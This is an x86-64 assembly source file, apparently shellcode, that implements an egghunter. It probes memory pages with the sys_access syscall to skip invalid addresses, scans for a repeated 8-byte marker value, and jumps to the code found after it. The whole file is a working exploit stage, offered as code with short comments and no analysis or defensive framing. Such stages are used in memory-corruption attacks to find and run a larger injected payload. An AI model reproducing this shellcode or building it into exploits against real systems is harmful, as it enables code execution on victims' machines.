
global _start

section .text
_start:

        xor rcx, rcx
        mul rcx ; zeroes rax and rdx too

page_alignment:
        or dx, 0xfff

address_inspection:
        inc rdx
        xor rsi, rsi    ; mode 0 in rsi
        mov rdi, rdx    ; move memory address rdi
        xor rax,rax
        add al, 21    ; sys_access syscall
        syscall

        cmp al, 0xf2    ; checking if sys_access result in EFAULT exception
        jz page_alignment

        mov rax, 0x5090509050905090 ; egg to search in memory
        mov rdi, rdx    ; comparing egg with memory location
        scasq
        
        ;xor rbx, rbx
        ;add ebx, 0x50905090 ; 
        ;cmp [rdx], ebx      ; 
        jnz address_inspection  ; move to next address and inspect doing all process again

        ;cmp [rdx+0x4], ebx                  ; checking for double egg
        scasq
        jnz address_inspection

        jmp rdi
        ;jmp rdx     ; we found our egg!!! 
